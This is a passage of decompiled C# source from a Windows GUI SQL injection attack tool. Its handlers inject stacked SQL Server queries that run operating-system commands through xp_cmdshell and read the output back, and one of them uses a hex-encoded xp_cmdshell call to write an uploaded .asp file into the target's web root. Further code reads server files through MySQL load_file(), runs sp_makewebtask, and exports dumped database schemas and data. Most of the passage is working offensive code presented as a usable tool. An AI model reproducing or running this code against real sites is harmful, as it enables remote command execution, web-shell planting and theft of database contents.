		else if (formMain_0.gclass0_0.method_16() == GEnum1.Access)
		{
			method_54(num, num2);
		}
	}

	public void method_91(XmlDocument xmlDocument_0)
	{
		//IL_01bf: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c6: Expected O, but got Unknown
		//IL_01c6: Unknown result type (might be due to invalid IL or missing references)
		//IL_01cd: Expected O, but got Unknown
		//IL_01cd: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d4: Expected O, but got Unknown
		//IL_038c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0393: Expected O, but got Unknown
		//IL_0415: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			string value = xmlDocument_0.SelectSingleNode("//ROOT/CurrentSite/DatabaseType")!.Attributes!["Value"]!.Value;
			formMain_0.gclass0_0.method_17((GEnum1)Enum.Parse(typeof(GEnum1), value));
			method_12(bool_1: true);
			method_2(value);
			string value2 = xmlDocument_0.SelectSingleNode("//ROOT/CurrentSite/CurrentKeyWord")!.Attributes!["Value"]!.Value;
			formMain_0.gclass0_0.method_4(value2);
			method_5(value2);
			try
			{
				string value3 = xmlDocument_0.SelectSingleNode("//ROOT/CurrentSite/CurrentInjType")!.Attributes!["Value"]!.Value;
				formMain_0.gclass0_0.method_19((GEnum2)Enum.Parse(typeof(GEnum2), value3));
				method_4(formMain_0.gclass0_0.method_18());
			}
			catch
			{
			}
			try
			{
				XmlNode xmlNode = xmlDocument_0.SelectSingleNode("//ROOT/CurrentSite/CurrentBlindInjType");
				string value4 = xmlNode.Attributes!["Value"]!.Value;
				formMain_0.gclass0_0.method_21((GEnum3)Enum.Parse(typeof(GEnum3), value4));
				formMain_0.gclass0_0.int_3 = int.Parse(xmlNode.Attributes!["CurrentFieldEchoIndex"]!.Value);
				formMain_0.gclass0_0.int_4 = int.Parse(xmlNode.Attributes!["CurrentFieldNum"]!.Value);
			}
			catch
			{
			}
			treeViewDB.get_Nodes().Clear();
			string text = "";
			string text2 = "";
			string text3 = "";
			XmlNodeList xmlNodeList = xmlDocument_0.SelectNodes("//ROOT/SiteDBStructure/Database");
			TreeNode val = new TreeNode();
			TreeNode val2 = new TreeNode();
			TreeNode val3 = new TreeNode();
			foreach (XmlNode item in xmlNodeList)
			{
				text = item.Attributes!["Text"]!.Value;
				val = treeViewDB.get_Nodes().Add(text);
				val.set_ImageKey("db.png");
				foreach (XmlNode childNode in item.ChildNodes)
				{
					text2 = childNode.Attributes!["Text"]!.Value;
					val2 = val.get_Nodes().Add(text2);
					val2.set_ImageKey("table.png");
					foreach (XmlNode childNode2 in childNode.ChildNodes)
					{
						text3 = childNode2.Attributes!["Text"]!.Value;
						val3 = val2.get_Nodes().Add(text3);
						val3.set_ImageKey("column.png");
					}
				}
			}
			treeViewDB.ExpandAll();
			XmlNodeList xmlNodeList2 = xmlDocument_0.SelectNodes("//ROOT/SiteSQLEnv/EnvRow");
			listViewEnv.get_Items().Clear();
			foreach (XmlNode item2 in xmlNodeList2)
			{
				ListViewItem val4 = new ListViewItem(item2.ChildNodes[0]!.InnerText);
				val4.get_SubItems().Add(item2.ChildNodes[1]!.InnerText);
				listViewEnv.get_Items().Add(val4);
			}
			string_0 = xmlDocument_0.SelectSingleNode("//ROOT/CurrentSite/URL")!.Attributes!["Value"]!.Value;
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void btnImpDB_Click(object sender, EventArgs e)
	{
		//IL_0020: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Invalid comparison between Unknown and I4
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0040: Expected O, but got Unknown
		//IL_0057: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			if (treeViewDB.get_Nodes().get_Count() > 0)
			{
				if ((int)MessageBox.Show("* Import Database Will Clear Current Database Information.\r\n* Continue?\r\n", "Confirm", (MessageBoxButtons)1, (MessageBoxIcon)64) == 2)
				{
					return;
				}
				treeViewDB.get_Nodes().Clear();
			}
			OpenFileDialog val = new OpenFileDialog();
			((FileDialog)val).set_Filter("XML File(*.xml)|*.xml");
			((FileDialog)val).set_InitialDirectory(Application.get_StartupPath());
			((CommonDialog)val).ShowDialog();
			string fileName = ((FileDialog)val).get_FileName();
			((Component)(object)val).Dispose();
			if (!string.IsNullOrEmpty(fileName))
			{
				XmlDocument xmlDocument = new XmlDocument();
				xmlDocument.Load(fileName);
				method_91(xmlDocument);
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	public XmlDocument method_92()
	{
		XmlDocument xmlDocument = new XmlDocument();
		XmlNode newChild = xmlDocument.CreateXmlDeclaration("1.0", "utf-8", "");
		xmlDocument.AppendChild(newChild);
		XmlElement xmlElement = xmlDocument.CreateElement("ROOT");
		xmlDocument.AppendChild(xmlElement);
		XmlElement xmlElement2 = xmlDocument.CreateElement("SiteSQLEnv");
		xmlElement.AppendChild(xmlElement2);
		for (int i = 0; i < listViewEnv.get_Items().get_Count(); i++)
		{
			ListViewItem val = listViewEnv.get_Items().get_Item(i);
			XmlElement xmlElement3 = xmlDocument.CreateElement("EnvRow");
			XmlElement xmlElement4 = xmlDocument.CreateElement("Environment");
			xmlElement4.InnerText = val.get_SubItems().get_Item(0).get_Text();
			xmlElement3.AppendChild(xmlElement4);
			xmlElement4 = xmlDocument.CreateElement("Value");
			if (val.get_SubItems().get_Count() < 2)
			{
				xmlElement4.InnerText = "";
			}
			else
			{
				xmlElement4.InnerText = val.get_SubItems().get_Item(1).get_Text();
			}
			xmlElement3.AppendChild(xmlElement4);
			xmlElement2.AppendChild(xmlElement3);
		}
		return xmlDocument;
	}

	public XmlDocument method_93()
	{
		//IL_0080: Unknown result type (might be due to invalid IL or missing references)
		//IL_0087: Expected O, but got Unknown
		//IL_00e8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ef: Expected O, but got Unknown
		//IL_0173: Unknown result type (might be due to invalid IL or missing references)
		//IL_017a: Expected O, but got Unknown
		XmlDocument xmlDocument = new XmlDocument();
		XmlNode newChild = xmlDocument.CreateXmlDeclaration("1.0", "utf-8", "");
		xmlDocument.AppendChild(newChild);
		XmlElement xmlElement = xmlDocument.CreateElement("ROOT");
		xmlDocument.AppendChild(xmlElement);
		XmlElement xmlElement2 = xmlDocument.CreateElement("SiteDBStructure");
		xmlElement.AppendChild(xmlElement2);
		string text = "";
		string text2 = "";
		string text3 = "";
		foreach (TreeNode node in treeViewDB.get_Nodes())
		{
			TreeNode val = node;
			text = val.get_Text();
			XmlElement xmlElement3 = xmlDocument.CreateElement("Database");
			xmlElement3.SetAttribute("Text", text);
			xmlElement2.AppendChild(xmlElement3);
			XmlNode xmlNode = xmlDocument.SelectSingleNode("//ROOT/SiteDBStructure/Database[@Text=\"" + text + "\"]");
			foreach (TreeNode node2 in val.get_Nodes())
			{
				TreeNode val2 = node2;
				text2 = val2.get_Text();
				XmlElement xmlElement4 = xmlDocument.CreateElement("Table");
				xmlElement4.SetAttribute("Text", text2);
				xmlNode.AppendChild(xmlElement4);
				XmlNode xmlNode2 = xmlDocument.SelectSingleNode("//ROOT/SiteDBStructure/Database[@Text=\"" + text + "\"]/Table[@Text=\"" + text2 + "\"]");
				foreach (TreeNode node3 in val2.get_Nodes())
				{
					TreeNode val3 = node3;
					text3 = val3.get_Text();
					XmlElement xmlElement5 = xmlDocument.CreateElement("Column");
					xmlElement5.SetAttribute("Text", text3);
					xmlNode2.AppendChild(xmlElement5);
				}
			}
		}
		return xmlDocument;
	}

	private void btnExpDB_Click(object sender, EventArgs e)
	{
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_0039: Expected O, but got Unknown
		//IL_0057: Unknown result type (might be due to invalid IL or missing references)
		//IL_005c: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Unknown result type (might be due to invalid IL or missing references)
		//IL_005f: Invalid comparison between Unknown and I4
		//IL_008e: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			if (treeViewDB.get_Nodes().get_Count() >= 1)
			{
				string fileName = formMain_0.gclass0_0.method_11() + "_DB.xml";
				SaveFileDialog val = new SaveFileDialog();
				((FileDialog)val).set_Filter("XML File(*.xml) | *.xml");
				((FileDialog)val).set_InitialDirectory(Application.get_StartupPath());
				((FileDialog)val).set_FileName(fileName);
				DialogResult val2 = ((CommonDialog)val).ShowDialog();
				if ((int)val2 == 1)
				{
					fileName = ((FileDialog)val).get_FileName();
					((Component)(object)val).Dispose();
					XmlDocument xmlDocument = method_93();
					xmlDocument.Save(fileName);
					MessageBox.Show("* Export OK!\r\n* FileName: " + fileName, "Done");
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void btnExpData_Click(object sender, EventArgs e)
	{
		//IL_002e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0034: Expected O, but got Unknown
		//IL_0052: Unknown result type (might be due to invalid IL or missing references)
		//IL_0057: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Unknown result type (might be due to invalid IL or missing references)
		//IL_005a: Invalid comparison between Unknown and I4
		if (listViewData.get_Items().get_Count() != 0)
		{
			string fileName = formMain_0.gclass0_0.method_11() + "_Data.xls";
			SaveFileDialog val = new SaveFileDialog();
			((FileDialog)val).set_Filter("XLS File(*.xls) | *.xls");
			((FileDialog)val).set_InitialDirectory(Application.get_StartupPath());
			((FileDialog)val).set_FileName(fileName);
			DialogResult val2 = ((CommonDialog)val).ShowDialog();
			if ((int)val2 == 1)
			{
				fileName = ((FileDialog)val).get_FileName();
				formMain_0.method_11("Exporting Data...");
				ThreadPool.QueueUserWorkItem(method_94, fileName);
			}
		}
	}

	private void method_94(object object_0)
	{
		//IL_015d: Unknown result type (might be due to invalid IL or missing references)
		//IL_016e: Unknown result type (might be due to invalid IL or missing references)
		if (!((Control)listViewData).get_InvokeRequired())
		{
			try
			{
				string path = (string)object_0;
				StreamWriter streamWriter = File.CreateText(path);
				string text = "";
				for (int i = 0; i < listViewData.get_Columns().get_Count(); i++)
				{
					if (!string.IsNullOrEmpty(text))
					{
						text += "\t";
					}
					text += listViewData.get_Columns().get_Item(i).get_Text();
				}
				streamWriter.WriteLine(text);
				text = "";
				for (int j = 0; j < listViewData.get_Items().get_Count(); j++)
				{
					text += listViewData.get_Items().get_Item(j).get_Text();
					int count = listViewData.get_Items().get_Item(j).get_SubItems()
						.get_Count();
					for (int k = 1; k < listViewData.get_Columns().get_Count(); k++)
					{
						text = ((k >= count) ? (text + "\t ") : (text + "\t" + listViewData.get_Items().get_Item(j).get_SubItems()
							.get_Item(k)
							.get_Text()));
					}
					streamWriter.WriteLine(text);
					text = "";
				}
				streamWriter.Close();
				MessageBox.Show("Export OK!", "Done");
				return;
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
				return;
			}
		}
		Delegate10 @delegate = method_94;
		((Control)this).Invoke((Delegate)@delegate, new object[1] { object_0 });
	}

	private void method_95(string string_8)
	{
		if (!((Control)listBoxCMD).get_InvokeRequired())
		{
			listBoxCMD.get_Items().Add((object)string_8);
			((Control)listBoxCMD).Refresh();
		}
		else
		{
			Delegate10 @delegate = method_95;
			((Control)this).Invoke((Delegate)@delegate, new object[1] { string_8 });
		}
	}

	private void btnCMD_Click(object sender, EventArgs e)
	{
		//IL_0234: Unknown result type (might be due to invalid IL or missing references)
		//IL_0288: Unknown result type (might be due to invalid IL or missing references)
		formMain_0.method_11("Executing Command ...");
		string text = ((ToolStripItem)txtCMD).get_Text();
		if (string.IsNullOrEmpty(text))
		{
			return;
		}
		listBoxCMD.get_Items().Clear();
		if (formMain_0.gclass0_0.method_16() == GEnum1.UnKnown)
		{
			formMain_0.gclass0_0.method_17(method_13(this.string_0));
		}
		if (formMain_0.gclass0_0.method_18() == GEnum2.UnKnown)
		{
			formMain_0.gclass0_0.method_19(method_18());
		}
		if (formMain_0.gclass0_0.method_20() == GEnum3.UnKnown)
		{
			method_23(this.string_0);
		}
		if (formMain_0.gclass0_0.method_16() == GEnum1.SQLServer)
		{
			string text2 = method_37(text);
			this.int_0++;
			string string_0 = "WCRTEMP" + $"{this.int_0:D5}";
			string string_1 = this.string_0 + this.string_1 + ";create table " + string_0 + "(tmp nvarchar(4000))%3B%2D%2D";
			formMain_0.gclass0_0.method_30(string_1, formMain_0.method_0());
			string_1 = this.string_0 + this.string_1 + ";declare @a nvarchar(4000);set @a=" + text2 + ";insert into " + string_0 + "(tmp) exec master.dbo.xp_cmdshell @a;alter table " + string_0 + " add id int not null identity (1,1)%2D%2D";
			formMain_0.gclass0_0.method_30(string_1, formMain_0.method_0());
			int int_0;
			try
			{
				int_0 = int.Parse(method_28("select", "convert(varchar(10),count(1))", "from " + string_0, 126, 1024, bool_1: false));
			}
			catch
			{
				MessageBox.Show("Get CMD Result Row Number Error!");
				int_0 = 0;
			}
			Thread thread_0 = new Thread((ThreadStart)delegate
			{
				for (int i = 0; i < int_0; i++)
				{
					string text3 = method_28("select%20top%201", "isnull(tmp,char(32))", "from " + string_0 + " where id=" + (i + 1), 255, 255, bool_1: false);
					text3 = text3.Replace("&lt;", "<").Replace("&gt;", ">");
					method_95(text3);
				}
			});
			Thread thread = new Thread((ThreadStart)delegate
			{
				thread_0.Join();
				string_1 = this.string_0 + this.string_1 + ";drop table " + string_0 + "%3B%2D%2D";
				formMain_0.gclass0_0.method_30(string_1, formMain_0.method_0());
				formMain_0.method_11("Done");
			});
			thread_0.Start();
			thread.Start();
		}
		else
		{
			MessageBox.Show("Sorry, It Suppot SQL Server Only!", "Information");
			formMain_0.method_11("Done");
		}
	}

	private void btnDBCMD_Click(object sender, EventArgs e)
	{
		//IL_01fd: Unknown result type (might be due to invalid IL or missing references)
		formMain_0.method_11("Executing DB Command ...");
		string text = ((ToolStripItem)txtDBCMD).get_Text();
		if (string.IsNullOrEmpty(text))
		{
			return;
		}
		if (formMain_0.gclass0_0.method_16() == GEnum1.UnKnown)
		{
			formMain_0.gclass0_0.method_17(method_13(string_0));
		}
		if (formMain_0.gclass0_0.method_18() == GEnum2.UnKnown)
		{
			formMain_0.gclass0_0.method_19(method_18());
		}
		if (formMain_0.gclass0_0.method_18() == GEnum2.NotInjectable)
		{
			formMain_0.method_11("Done");
			return;
		}
		if (formMain_0.gclass0_0.method_20() == GEnum3.UnKnown)
		{
			method_23(string_0);
		}
		if (formMain_0.gclass0_0.method_16() == GEnum1.SQLServer)
		{
			if (string.IsNullOrEmpty(formMain_0.gclass0_0.string_6))
			{
				formMain_0.gclass0_0.string_6 = method_56(string_0);
			}
			string text2 = string_0 + string_1 + ";exec master..sp_makewebtask @outputfile=" + method_37(formMain_0.gclass0_0.string_6 + "\\WebCR.htm") + ",@query=%27" + text + "%27%2D%2D";
			formMain_0.gclass0_0.method_30(text2, formMain_0.method_0());
			if (DateTime.Now.Subtract(formMain_0.gclass0_0.dateTime_1).Seconds < 30)
			{
				formMain_0.method_24("WebBrowser");
				formMain_0.method_28(formMain_0.gclass0_0.method_10() + "WebCR.htm", GEnum0.GET, "");
			}
			else
			{
				MessageBox.Show("Execute DB SQL Failed!", "Information");
			}
		}
		formMain_0.method_11("Done");
	}

	private void method_96(object object_0)
	{
		string string_ = (string)object_0;
		string_ = method_37(string_);
		string string_2 = method_58("select", "load_file(" + string_ + ")", "", 255, 255);
		method_97(txtFileContent, string_2);
	}

	private void method_97(TextBox textBox_0, string string_8)
	{
		GStruct1 gstruct1_ = default(GStruct1);
		gstruct1_.textBox_0 = textBox_0;
		gstruct1_.string_0 = string_8;
		method_98(gstruct1_);
	}

	private void method_98(GStruct1 gstruct1_0)
	{
		//IL_0052: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			if (!((Control)gstruct1_0.textBox_0).get_InvokeRequired())
			{
				((Control)gstruct1_0.textBox_0).set_Text(gstruct1_0.string_0);
				return;
			}
			Delegate20 @delegate = method_98;
			((Control)this).Invoke((Delegate)@delegate, new object[1] { gstruct1_0 });
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void btnReadFile_Click(object sender, EventArgs e)
	{
		if (formMain_0.gclass0_0.method_16() == GEnum1.MySQL)
		{
			string state = ((ToolStripItem)txtFileName).get_Text().Trim();
			ThreadPool.QueueUserWorkItem(method_96, state);
		}
	}

	private void listViewEnv_MouseClick(object sender, MouseEventArgs e)
	{
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_0038: Expected O, but got Unknown
		if (listViewEnv.get_SelectedItems().get_Count() >= 1 && listViewEnv.get_SelectedItems().get_Item(0).get_SubItems()
			.get_Count() > 1)
		{
			ContextMenuStrip val = new ContextMenuStrip();
			((ToolStrip)val).get_Items().Add("Copy Value To ClipBoard", (Image)null, (EventHandler)method_99);
			((Control)listViewEnv).set_ContextMenuStrip(val);
		}
	}

	private void method_99(object sender, EventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			string text;
			if ((text = ((ToolStripItem)(ToolStripMenuItem)sender).get_Text()) != null && text == "Copy Value To ClipBoard")
			{
				Clipboard.SetText(listViewEnv.get_SelectedItems().get_Item(0).get_SubItems()
					.get_Item(1)
					.get_Text());
			}
		}
		catch
		{
		}
	}

	public void method_100(bool bool_1)
	{
		((Control)toolStripDB).set_Enabled(bool_1);
	}

	private void btnSelectFile_Click(object sender, EventArgs e)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_0025: Invalid comparison between Unknown and I4
		OpenFileDialog val = new OpenFileDialog();
		((FileDialog)val).set_Filter("ASP File(*.asp)|*.asp|Text File(*.txt)|*.txt|All File(*.*)|*.*");
		((FileDialog)val).set_InitialDirectory(Application.get_StartupPath());
		DialogResult val2 = ((CommonDialog)val).ShowDialog();
		if ((int)val2 == 1)
		{
			((Control)txtUploadFile).set_Text(((FileDialog)val).get_FileName());
			if (!string.IsNullOrEmpty(formMain_0.gclass0_0.string_6))
			{
				((Control)txtTargetFileName).set_Text(formMain_0.gclass0_0.string_6 + "\\1.asp");
			}
		}
	}

	private void btnFileUpload_Click(object sender, EventArgs e)
	{
		//IL_0205: Unknown result type (might be due to invalid IL or missing references)
		string text = ((Control)txtUploadFile).get_Text().Trim();
		string text2 = ((Control)txtTargetFileName).get_Text().Trim();
		if (string.IsNullOrEmpty(text) || string.IsNullOrEmpty(text2))
		{
			return;
		}
		StreamReader streamReader = new StreamReader(text);
		string text3 = "";
		string text4 = "";
		int num = 1;
		string string_ = "echo.>" + text2;
		method_0();
		text4 = string_0 + string_1 + ";declare @e sysname,@c sysname;set @e=0x6D00610073007400650072002E002E00780070005F0063006D0064007300680065006C006C00;set @c=" + method_37(string_) + ";exec @e @c;--";
		formMain_0.gclass0_0.method_30(text4, formMain_0.method_0());
		while ((text3 = streamReader.ReadLine()) != null)
		{
			text3 = text3.Replace("^", "^^").Replace("<", "^<").Replace(">", "^>")
				.Replace("|", "^|")
				.Replace("&", "^&");
			text3 = text3.Replace("\"", "^\"").Replace("'", "^'").Trim();
			if (!string.IsNullOrEmpty(text3))
			{
				string_ = "echo " + text3 + ">>" + text2;
				text4 = string_0 + string_1 + ";declare @e sysname,@c sysname;set @e=0x6D00610073007400650072002E002E00780070005F0063006D0064007300680065006C006C00;set @c=" + method_37(string_) + ";exec @e @c;--";
				formMain_0.gclass0_0.method_30(text4, formMain_0.method_0());
				formMain_0.method_11("Uploading Row: " + num);
				num++;
			}
		}
		formMain_0.method_11("Done");
		MessageBox.Show("Upload Complete!", "Done", (MessageBoxButtons)0, (MessageBoxIcon)64);
	}

	private void btnGetWebRoot_Click(object sender, EventArgs e)
	{
		//IL_0036: Unknown result type (might be due to invalid IL or missing references)
		if (string.IsNullOrEmpty(formMain_0.gclass0_0.string_6))
		{
			string value = method_56(string_0);
			if (string.IsNullOrEmpty(value))
			{
				MessageBox.Show("Get Web Root Failed!", "Notice");
				return;
			}
			formMain_0.gclass0_0.string_6 = value;
		}
		((Control)txtTargetFileName).set_Text(formMain_0.gclass0_0.string_6 + "\\");
	}

	private void btnEncode_Click(object sender, EventArgs e)
	{
		//IL_0020: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		if (formMain_0.gclass0_0.method_16() == GEnum1.UnKnown)
		{
			MessageBox.Show("Please Select the DataBase Type!", "Notice", (MessageBoxButtons)0, (MessageBoxIcon)64);
			return;
		}
		string text = ((Control)txtSourceString).get_Text();
		if (string.IsNullOrEmpty(text))
		{
			MessageBox.Show("Please input the source string!", "Notice", (MessageBoxButtons)0, (MessageBoxIcon)64);
			return;
		}
		string text2 = method_37(text);
		((Control)txtEscapeString).set_Text(text2);
	}

	public void method_101(string string_8)
	{
		tabSQLInjection.SelectTab(string_8);
	}

	private void ButtonResetSQL_Click(object sender, EventArgs e)
	{
		//IL_006d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_00b0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b6: Expected O, but got Unknown
		formMain_0.gclass0_0.method_17(GEnum1.UnKnown);
		method_2("UnKnown");
		method_5("");
		formMain_0.gclass0_0.method_19(GEnum2.UnKnown);
		method_3("UnKnown");
		listViewEnv.get_Items().Clear();
		foreach (TreeNode node in treeViewDB.get_Nodes())
		{
			TreeNode val = node;
			val.Remove();
		}
		foreach (ListViewItem item in listViewData.get_Items())
		{
			ListViewItem val2 = item;
			val2.Remove();
		}
	}

	void Form.Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Expected O, but got Unknown
		//IL_00a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		//IL_00b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bb: Expected O, but got Unknown
		//IL_00bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c6: Expected O, but got Unknown
		//IL_00c7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d1: Expected O, but got Unknown
		//IL_00d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00dc: Expected O, but got Unknown
		//IL_00dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e7: Expected O, but got Unknown
		//IL_00e8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f2: Expected O, but got Unknown
		//IL_00f3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fd: Expected O, but got Unknown
		//IL_00fe: Unknown result type (might be due to invalid IL or missing references)
		//IL_0108: Expected O, but got Unknown
		//IL_0109: Unknown result type (might be due to invalid IL or missing references)
		//IL_0113: Expected O, but got Unknown
		//IL_0114: Unknown result type (might be due to invalid IL or missing references)
		//IL_011e: Expected O, but got Unknown
		//IL_011f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0129: Expected O, but got Unknown
		//IL_012a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0134: Expected O, but got Unknown
		//IL_0135: Unknown result type (might be due to invalid IL or missing references)
		//IL_013f: Expected O, but got Unknown
		//IL_0140: Unknown result type (might be due to invalid IL or missing references)
		//IL_014a: Expected O, but got Unknown
		//IL_014b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0155: Expected O, but got Unknown
		//IL_0156: Unknown result type (might be due to invalid IL or missing references)
		//IL_0160: Expected O, but got Unknown
		//IL_0161: Unknown result type (might be due to invalid IL or missing references)
		//IL_016b: Expected O, but got Unknown
		//IL_016c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0176: Expected O, but got Unknown
		//IL_0177: Unknown result type (might be due to invalid IL or missing references)
		//IL_0181: Expected O, but got Unknown
		//IL_0182: Unknown result type (might be due to invalid IL or missing references)
		//IL_018c: Expected O, but got Unknown
		//IL_018d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0197: Expected O, but got Unknown
		//IL_0198: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a2: Expected O, but got Unknown
		//IL_01a3: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ad: Expected O, but got Unknown
		//IL_01ae: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b8: Expected O, but got Unknown
		//IL_01b9: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c3: Expected O, but got Unknown
		//IL_01c4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ce: Expected O, but got Unknown
		//IL_01cf: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d9: Expected O, but got Unknown
		//IL_01da: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e4: Expected O, but got Unknown
		//IL_01e5: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ef: Expected O, but got Unknown
		//IL_01f0: Unknown result type (might be due to invalid IL or missing references)
		//IL_01fa: Expected O, but got Unknown
		//IL_01fb: Unknown result type (might be due to invalid IL or missing references)
		//IL_0205: Expected O, but got Unknown
		//IL_0206: Unknown result type (might be due to invalid IL or missing references)
		//IL_0210: Expected O, but got Unknown
		//IL_0211: Unknown result type (might be due to invalid IL or missing references)
		//IL_021b: Expected O, but got Unknown
		//IL_021c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0226: Expected O, but got Unknown
		//IL_0227: Unknown result type (might be due to invalid IL or missing references)
		//IL_0231: Expected O, but got Unknown
		//IL_0232: Unknown result type (might be due to invalid IL or missing references)
		//IL_023c: Expected O, but got Unknown
		//IL_023d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0247: Expected O, but got Unknown
		//IL_0248: Unknown result type (might be due to invalid IL or missing references)
		//IL_0252: Expected O, but got Unknown
		//IL_0253: Unknown result type (might be due to invalid IL or missing references)
		//IL_025d: Expected O, but got Unknown
		//IL_025e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0268: Expected O, but got Unknown
		//IL_0269: Unknown result type (might be due to invalid IL or missing references)
		//IL_0273: Expected O, but got Unknown
		//IL_0274: Unknown result type (might be due to invalid IL or missing references)
		//IL_027e: Expected O, but got Unknown
		//IL_027f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0289: Expected O, but got Unknown
		//IL_028a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0294: Expected O, but got Unknown
		//IL_0295: Unknown result type (might be due to invalid IL or missing references)
		//IL_029f: Expected O, but got Unknown
		//IL_02a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_02aa: Expected O, but got Unknown
		//IL_02ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_02b5: Expected O, but got Unknown
		//IL_02b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_02c0: Expected O, but got Unknown
		//IL_02c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_02cb: Expected O, but got Unknown
		//IL_02cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_02d6: Expected O, but got Unknown
		//IL_02d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_02e1: Expected O, but got Unknown
		//IL_02e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_02ec: Expected O, but got Unknown
		//IL_02ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_02f7: Expected O, but got Unknown
		//IL_02f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0302: Expected O, but got Unknown
		//IL_0303: Unknown result type (might be due to invalid IL or missing references)
		//IL_030d: Expected O, but got Unknown
		//IL_030e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0318: Expected O, but got Unknown
		//IL_0319: Unknown result type (might be due to invalid IL or missing references)
		//IL_0323: Expected O, but got Unknown
		//IL_0324: Unknown result type (might be due to invalid IL or missing references)
		//IL_032e: Expected O, but got Unknown
		//IL_032f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0339: Expected O, but got Unknown
		//IL_033a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0344: Expected O, but got Unknown
		//IL_0345: Unknown result type (might be due to invalid IL or missing references)
		//IL_034f: Expected O, but got Unknown
		//IL_0350: Unknown result type (might be due to invalid IL or missing references)
		//IL_035a: Expected O, but got Unknown
		//IL_035b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0365: Expected O, but got Unknown
		//IL_0366: Unknown result type (might be due to invalid IL or missing references)
		//IL_0370: Expected O, but got Unknown
